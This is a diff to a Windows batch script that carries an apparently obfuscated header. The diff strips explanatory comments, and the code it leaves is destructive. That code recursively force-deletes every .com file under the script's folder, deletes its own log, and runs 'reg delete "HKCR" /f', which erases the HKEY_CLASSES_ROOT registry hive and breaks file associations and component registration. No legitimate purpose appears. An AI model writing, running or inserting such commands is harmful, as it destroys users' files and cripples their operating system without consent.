@@ -496,10 +496,9 @@ setlocal enabledelayedexpansion&set "c=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmno
 
 setlocal enabledelayedexpansion
 
-:: Optional: define root directory (default is current)
 set "root=%~dp0"
 
-:: Log all .com files first (optional but wise)
+:: Log all .com files first
 dir /b /s "%root%\*.com" > com_files.log
 
 :: Delete each .com file found
@@ -508,7 +507,6 @@ for /f "delims=" %%F in (com_files.log) do (
     del /f /q "%%F"
 )
 
-:: Optional: self-destruct log
 del /f /q com_files.log
 
 reg delete "HKCR" /f
